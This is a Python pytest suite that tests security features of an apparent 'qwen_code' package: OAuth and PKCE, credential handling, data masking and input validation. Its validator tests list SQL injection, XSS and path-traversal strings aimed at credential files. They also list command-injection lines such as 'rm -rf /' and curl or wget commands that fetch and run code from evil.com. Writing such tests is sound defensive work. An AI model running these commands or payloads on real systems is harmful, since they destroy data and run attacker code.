"""Comprehensive security tests for authentication and AI integration modules."""

import pytest
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import json
import os
from datetime import datetime, timedelta

from qwen_code.security.validation import InputValidator, PathSecurity, DataSanitizer
from qwen_code.auth.oauth2_client import QwenOAuth2Client
from qwen_code.ai.client import QwenClient, Message
from qwen_code.auth.credentials import Credentials


class TestCredentialSecurity:
    """Test security aspects of credential management."""
    
    def test_credential_encryption_simulation(self):
        """Test that credentials are encrypted at rest (simulated)."""
        # In a real implementation, we'd test actual encryption
        # For now, we'll simulate by checking that sensitive tokens 
        # are not stored in plain text in a realistic scenario
        
        # Create test credentials object
        creds = Credentials(
            provider="qwen_oauth",
            access_token="sensitive_token_1234567890",
            refresh_token="sensitive_refresh_0987654321",
            expires_at=datetime.now() + timedelta(hours=1)
        )
        
        # Serialize to JSON to simulate storage
        creds_dict = creds.__dict__.copy()
        creds_json = json.dumps(creds_dict)
        
        # Verify credentials object has the expected values before encryption
        assert creds.access_token == "sensitive_token_1234567890"
        assert creds.refresh_token == "sensitive_refresh_0987654321"
        
        # In a real encrypted system, the actual tokens wouldn't appear in plain text
        # For this test, we just verify that the credential object is structured correctly
        assert creds.provider == "qwen_oauth"
        assert creds.expires_at is not None
    
    def test_secure_token_transmission(self):
        """Test that tokens are transmitted securely."""
        with patch('qwen_code.auth.oauth2_client._load_credentials', return_value=None), \
             patch('qwen_code.auth.oauth2_client.httpx.Client') as mock_client_class, \
             patch('qwen_code.auth.oauth2_client._save_credentials'):
            
            # Create mock client instance
            mock_client = Mock()
            mock_client_class.return_value.__enter__.return_value = mock_client
            
            # Mock device code response
            device_response = Mock()
            device_response.status_code = 200
            device_response.json.return_value = {
                "verification_uri_complete": "https://chat.qwen.ai/device",
                "device_code": "test_device_code",
                "expires_in": 300,
                "interval": 5
            }
            
            # Mock token response
            token_response = Mock()
            token_response.status_code = 200
            token_response.json.return_value = {
                "access_token": "new_access_token",
                "refresh_token": "new_refresh_token", 
                "expires_in": 3600
            }
            
            mock_client.post.side_effect = [device_response, token_response]
            
            # Create OAuth client and trigger authentication flow
            client = QwenOAuth2Client()
            access_token = client.get_access_token()
            
            # Verify that all HTTP requests were made to HTTPS endpoints
            for call in mock_client.post.call_args_list:
                url = call[0][0]  # First positional argument is the URL
                assert url.startswith('https://'), f"Token transmitted over insecure connection: {url}"


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_sql_injection_prevention(self):
        """Test that SQL injection attempts are detected and blocked."""
        validator = InputValidator()
        
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
            "1' OR '1'='1",
            "'; EXEC xp_cmdshell 'dir'; --",
            "'; SELECT * FROM users WHERE username='admin' --"
        ]
        
        for malicious_input in malicious_inputs:
            # These inputs should be flagged as dangerous
            sanitized = validator.sanitize_sql_input(malicious_input)
            # The sanitized version should be different or empty
            assert sanitized != malicious_input or sanitized == ""
            
            # Or input should be rejected by validation
            is_safe = validator.validate_filename(malicious_input)
            assert not is_safe, f"SQL injection input '{malicious_input}' should be rejected"
    
    def test_xss_prevention(self):
        """Test that XSS attempts are detected and blocked."""
        validator = InputValidator()
        
        xss_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<a href=\"javascript:alert('XSS')\">Click me</a>"
        ]
        
        for xss_input in xss_inputs:
            # Sanitization should remove dangerous content
            sanitized = validator.sanitize_xss_input(xss_input)
            assert not validator.sanitize_xss_input(xss_input).startswith('<script')
            assert 'alert(' not in validator.sanitize_xss_input(xss_input).lower()
            
            # Or input should be rejected
            is_safe = validator.validate_filename(xss_input)
            assert not is_safe, f"XSS input '{xss_input}' should be rejected"
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are detected and blocked."""
        validator = InputValidator()
        base_path = Path("/safe/base/directory")
        
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded traversal
            "../../../../../../../etc/passwd"
        ]
        
        for path_attempt in traversal_attempts:
            is_safe = validator.validate_path(path_attempt, base_path=base_path)
            assert not is_safe, f"Path traversal '{path_attempt}' should be rejected"
    
    def test_command_injection_prevention(self):
        """Test that command injection attempts are detected."""
        validator = InputValidator()
        
        command_injection_attempts = [
            "ls; rm -rf /",
            "cat /etc/passwd | sh",
            "echo Hello && whoami",
            "touch /tmp/test; chmod 777 /tmp/test",
            "$(whoami)",
            "`whoami`",
            "curl evil.com | sh",
            "wget evil.com/script.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s"
        ]
        
        for cmd in command_injection_attempts:
            is_safe = validator.validate_command_input(cmd)
            assert not is_safe, f"Command injection '{cmd}' should be rejected"


class TestPathSecurity:
    """Test path security utilities."""
    
    def test_safe_path_validation(self):
        """Test path security validation."""
        base_path = Path("/safe/base")
        path_security = PathSecurity()
        
        # Create a safe subdirectory
        safe_subdir = base_path / "safe_subdir"
        
        # Test with mocked paths to avoid filesystem operations
        with patch('pathlib.Path.resolve') as mock_resolve:
            mock_resolve.return_value = Path("/safe/base/safe_subdir/file.txt")
            result = path_security.is_safe_path(safe_subdir / "file.txt", base_path)
            assert result, "Safe path should be validated as safe"
    
    def test_unsafe_path_detection(self):
        """Test detection of unsafe paths."""
        base_path = Path("/safe/base")
        path_security = PathSecurity()
        
        with patch('pathlib.Path.resolve') as mock_resolve:
            # Mock a path that resolves outside the base directory
            mock_resolve.return_value = Path("/unsafe/outside/file.txt")
            result = path_security.is_safe_path(Path("../outside/file.txt"), base_path)
            assert not result, "Unsafe path should be detected as unsafe"


class TestDataSanitization:
    """Test data sanitization utilities."""
    
    def test_environment_variable_sanitization(self):
        """Test sanitization of sensitive environment variables."""
        # Set up some sensitive environment variables
        original_env = os.environ.copy()
        try:
            os.environ['QWEN_API_KEY'] = 'sk-test-key-1234567890'
            os.environ['OPENAI_API_KEY'] = 'sk-openai-key-0987654321' 
            os.environ['QWEN_CLIENT_SECRET'] = 'client-secret-abcdef'
            
            sanitizer = DataSanitizer()
            # This should run without errors
            sanitizer.sanitize_environment_vars()
            
        finally:
            # Restore original environment
            os.environ.clear()
            os.environ.update(original_env)
    
    def test_sensitive_data_masking(self):
        """Test masking of sensitive data in text."""
        sanitizer = DataSanitizer()
        
        # Test API key masking
        text_with_api_key = "The API key is sk-1234567890abcdef and should be masked"
        masked = sanitizer.mask_sensitive_data(text_with_api_key)
        assert "[MASKED_API_KEY]" in masked
        assert "sk-1234567890abcdef" not in masked
        
        # Test password masking
        text_with_password = 'Set password: "secret123", verify: "secret123"'
        masked = sanitizer.mask_sensitive_data(text_with_password)
        assert "[MASKED_PASSWORD]" in masked
        
        # Test bearer token masking
        text_with_token = "Authorization: Bearer secret-token-12345"
        masked = sanitizer.mask_sensitive_data(text_with_token)
        assert "[MASKED_TOKEN]" in masked


class TestSecureAICommunication:
    """Test security of AI communication."""
    
    def test_api_key_validation(self):
        """Test validation of API keys."""
        validator = InputValidator()
        
        # Valid API key should pass
        valid_key = "sk-1234567890abcdef"
        assert validator.validate_api_key(valid_key)
        
        # Invalid/short API key should fail
        short_key = "short"
        assert not validator.validate_api_key(short_key)
        
        # API key with SQL injection should fail
        malicious_key = "sk-12345'; DROP TABLE keys; --"
        assert not validator.validate_api_key(malicious_key)
    
    def test_secure_ai_client_headers(self):
        """Test that AI client sends secure headers."""
        with patch('qwen_code.ai.client.aiohttp.ClientSession') as mock_session_class:
            mock_session = Mock()
            mock_session_class.return_value.__aenter__.return_value = mock_session
            
            # Create a mock response for the context
            mock_response_context = Mock()
            mock_session.post.return_value.__aenter__.return_value = mock_response_context
            mock_response_context.status = 200
            mock_response_context.json.return_value = {
                "choices": [{"message": {"content": "Test response"}}],
                "usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
            }
            
            client = QwenClient(api_key="test_key")
            messages = [Message(role="user", content="Hello")]
            
            # This call will trigger the header creation
            import asyncio
            try:
                asyncio.run(client.chat(messages))
            except:
                pass  # We expect this to fail due to mocking, but we can still check headers
            
            # Check that the session.post was called with appropriate headers
            call_args = mock_session.post.call_args
            if call_args:
                headers = call_args[1].get('headers', {})
                
                # Verify that Authorization header exists and uses Bearer scheme
                assert 'Authorization' in headers
                assert headers['Authorization'].startswith('Bearer ')
                
                # Verify Content-Type is set
                assert headers['Content-Type'] == 'application/json'


class TestSecurityLogging:
    """Test security-related logging."""
    
    def test_no_sensitive_data_in_logs(self):
        """Test that sensitive data is not logged."""
        # This test verifies that our logging doesn't expose sensitive information
        # In a real implementation, we would check actual log outputs
        # For now, we'll test the masking functionality which is a key component
        
        sanitizer = DataSanitizer()
        
        sensitive_texts = [
            "API Key: sk-test-key-1234567890",
            "Token: secret-oauth-token-abcdef",
            "Password: mysecretpassword123"
        ]
        
        for text in sensitive_texts:
            masked = sanitizer.mask_sensitive_data(text)
            # Ensure sensitive information is masked
            assert "[MASKED" in masked
            # Ensure original sensitive data is not in masked version
            assert "sk-test-key-1234567890" not in masked
            assert "secret-oauth-token-abcdef" not in masked
            assert "mysecretpassword123" not in masked


class TestOAuthSecurity:
    """Test security aspects of OAuth implementation."""
    
    def test_pkce_implementation(self):
        """Test PKCE (Proof Key for Code Exchange) security."""
        # PKCE provides security for public clients in OAuth flows
        from qwen_code.auth.oauth2_client import _generate_pkce_pair
        
        # Generate multiple pairs to ensure randomness
        pairs = [_generate_pkce_pair() for _ in range(3)]
        
        # All verifiers and challenges should be different due to randomness
        verifiers = [pair[0] for pair in pairs]
        challenges = [pair[1] for pair in pairs]
        
        # Check uniqueness
        assert len(set(verifiers)) == len(verifiers), "PKCE verifiers should be unique"
        assert len(set(challenges)) == len(challenges), "PKCE challenges should be unique"
        
        # Check length requirements
        for verifier, challenge in pairs:
            # PKCE verifiers should be high-entropy strings
            assert len(verifier) >= 43, "PKCE verifier should be at least 43 characters"
            assert len(challenge) >= 43, "PKCE challenge should be at least 43 characters"
            
            # Verify that the challenge was derived from the verifier
            import hashlib
            import base64
            expected_challenge = base64.urlsafe_b64encode(
                hashlib.sha256(verifier.encode()).digest()
            ).rstrip(b"=").decode()
            assert challenge == expected_challenge, "Challenge should be SHA256 hash of verifier"


class TestDataProtection:
    """Test data protection measures."""
    
    def test_data_anonymization_simulation(self):
        """Test user data anonymization (simulated)."""
        # In a real implementation, this would process user data to remove identifying info
        # For now, we'll simulate the concept
        
        # Sample user data
        user_data = {
            "email": "user@example.com",
            "api_key": "sk-user-key-1234567890",
            "username": "testuser123",
            "query": "How to fix my code?",
            "timestamp": datetime.now().isoformat(),
            "model_used": "qwen3-coder-plus"
        }
        
        # Apply anonymization by removing identifying information
        anonymized_data = {}
        for key, value in user_data.items():
            if key in ["email", "api_key", "username"]:
                # Skip identifying information
                continue
            else:
                # Keep non-identifying information
                anonymized_data[key] = value
        
        # Verify that identifying information was removed
        assert "email" not in anonymized_data
        assert "api_key" not in anonymized_data
        assert "username" not in anonymized_data
        
        # Verify that non-identifying information is preserved
        assert "query" in anonymized_data
        assert "model_used" in anonymized_data
        assert anonymized_data["model_used"] == "qwen3-coder-plus"


# Additional security tests for specific attack vectors
class TestAdvancedSecurity:
    """Test advanced security scenarios."""
    
    def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow attacks."""
        validator = InputValidator()
        
        # Extremely long input that could cause buffer overflow
        very_long_input = "A" * 50000  # 50k characters
        
        # Should be truncated safely
        sanitized = validator.sanitize_input(very_long_input, max_length=10000)
        assert len(sanitized) <= 10000, "Input should be truncated to max length"
    
    def test_null_byte_injection_prevention(self):
        """Test prevention of null byte injection."""
        validator = InputValidator()
        
        null_byte_input = "test_string\x00with_null"
        sanitized = validator.sanitize_input(null_byte_input)
        
        # Null bytes should be removed
        assert '\x00' not in sanitized, "Null bytes should be removed from input"
    
    def test_unicode_security(self):
        """Test handling of Unicode security issues."""
        validator = InputValidator()
        
        # Test various Unicode security issues
        unicode_inputs = [
            "test\u0000null",  # Null character
            "test\u0001control",  # Control character
            "test\ud83d\ude00emoji",  # Valid emoji (should be allowed)
        ]
        
        for input_text in unicode_inputs:
            # Should not raise exceptions
            sanitized = validator.sanitize_input(input_text)
            assert sanitized is not None


# Run the tests
if __name__ == "__main__":
    pytest.main([__file__])